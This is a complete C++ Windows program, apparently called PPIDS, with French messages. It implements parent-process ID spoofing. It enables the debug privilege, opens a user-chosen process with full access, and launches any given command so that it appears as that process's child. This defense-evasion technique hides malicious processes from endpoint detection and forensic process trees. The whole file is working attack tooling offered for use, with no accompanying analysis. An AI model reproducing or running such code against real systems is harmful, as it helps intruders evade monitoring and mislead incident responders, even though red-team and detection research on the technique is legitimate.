#include <tchar.h>
#include <windows.h>
#include <iostream>
#include <string>
BOOL AdjustCurrentProcessToken(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES sTP;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}
int _tmain(int argc, _TCHAR* argv[])
{
	STARTUPINFOEX sie = { sizeof(sie) };
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = nullptr;
	HANDLE hParentProcess = nullptr;
	DWORD dwPid = 0;
	_TCHAR* lpCommandLine = nullptr;

	if (argc != 5 || (!_tcscmp(L"--help", argv[1]) || !_tcscmp(L"-h", argv[1]))) {
		std::cout << " -p  --pid <PID>    ID de processus parent" << std::endl;
		std::cout << " -c  --cmd <CMD>    commande a executer" << std::endl;
		std::cout << " usage: PPIDS.exe -c programme -p pid" << std::endl;
		std::cout << " exemple: PPIDS.exe -c notepad.exe -p 8887" << std::endl;
	}
	else
	{
		if ((_tcscmp(L"--pid", argv[1]) == 0 || _tcscmp(L"-p", argv[1]) == 0) &&
			(_tcscmp(L"--cmd", argv[3]) == 0 || _tcscmp(L"-c", argv[3]) == 0))
		{
			dwPid = std::stoi(argv[2]);
			lpCommandLine = argv[4];
		}
		else if ((_tcscmp(L"--cmd", argv[1]) == 0 || _tcscmp(L"-c", argv[1]) == 0) &&
			(_tcscmp(L"--pid", argv[3]) == 0 || _tcscmp(L"-p", argv[3]) == 0))
		{
			lpCommandLine = argv[2];
			dwPid = std::stoi(argv[4]);
		}
		else
		{
			std::cout << " [x] Parametres de ligne de commande incorrects" << std::endl;
			return 0;
		}
		InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
		pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
		if (NULL == pAttributeList)
		{
			std::cout << " [x] Erreur lors de l allocation du segment de memoire: " << GetLastError() << std::endl;
			return 0;
		}
		if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
		{
			std::cout << " [x] Erreur lors de l initialisation de l attribut proccess: " << GetLastError() << std::endl;
			return 0;
		}
		AdjustCurrentProcessToken();
		hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
		if (NULL == hParentProcess)
		{
			std::cout << " [x] Erreur lors de l ouverture du processus parent: " << GetLastError() << std::endl;
			return 0;
		}
		if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
		{
			std::cout << " [x] Erreur lors de la mise a jour PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: " << GetLastError() << std::endl;
			return 0;
		}
		sie.lpAttributeList = pAttributeList;
		if (!CreateProcess(NULL, lpCommandLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
		{
			std::cout << " [x] Erreur lors de la creation du processus: " << GetLastError();
			return 0;
		}
		std::cout << " [+] Reussi: " << pi.dwProcessId << std::endl;
		DeleteProcThreadAttributeList(pAttributeList);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hParentProcess);
	}
	return 0;
}